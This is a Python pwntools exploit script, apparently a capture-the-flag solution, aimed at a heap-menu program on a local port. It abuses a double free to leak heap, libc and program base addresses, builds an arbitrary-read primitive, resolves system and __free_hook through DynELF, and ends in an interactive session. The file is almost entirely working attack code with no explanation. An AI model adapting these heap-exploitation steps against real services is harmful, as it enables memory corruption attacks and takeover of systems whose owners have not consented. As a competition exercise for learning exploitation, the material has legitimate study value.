from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(idx,size,c='A',tp=1,color=1):
	cmd(1)
	cmd(tp)
	cmd(color)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	p.sendlineafter(": ",str(idx))
def free(idx):
	cmd(4)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c='A'):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	cmd(2)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	cmd(3)
def show(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
def leak(addr):
	edit(3,0x28,p64(3)*2+p64(0x100)+p64(addr))
	show(0)
	p.readuntil("ti: ")
	data=p.readuntil("\n===")[:-4]
	if len(data)==0:
		return '\0'
	else:
		#print data
		return data
#context.log_level='debug'
context.arch='amd64'
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
p=remote('0.0.0.0',1024)
p.sendlineafter(": ","n132")
p.sendlineafter(": ","n132")
add(0,0x88)
add(1,0x38)
for x in range(2):
	free(0)
show(0)
p.readuntil("ti: ")
heap=u64(p.readline()[:-1]+'\0\0')-0x6d0
log.warning(hex(heap))
for x in range(6):
	free(0)
show(0)
p.readuntil("ti: ")
base=u64(p.readline()[:-1]+'\0\0')
log.warning(hex(base))
add(2,0x88,p64(0)+"AAAABBBB",0,0)
free(1)
add(3,0x28,p64(3)*2+p64(0x100)+p64(-478*8+base))
pie=u64(leak(base-478*8)[:8].ljust(8,'\x00'))
pie=(pie&0xfffffffffffff000)-0x202000
d=DynELF(leak,pie)
sys=d.lookup("system",'libc')
hook=d.lookup("__free_hook",'libc')
log.warning(hex(hook))
#log.warning(hex(base-0x70-libc.sym['__malloc_hook']+libc.sym['__free_hook']))
log.warning(hex(sys))
#log.warning(hex(base-0x70-libc.sym['__malloc_hook']+libc.sym['system']))

#print addr
#log.warning(hex(addr))
#log.warning(hex(u64(leak()[:8].ljust(8,'\x00'))))
#for x in range(-0x300,0x1000):
#	print hex(u64(leak(base+x*8)[:8].ljust(8,'\x00')))+":idx="+str(x)
p.interactive()
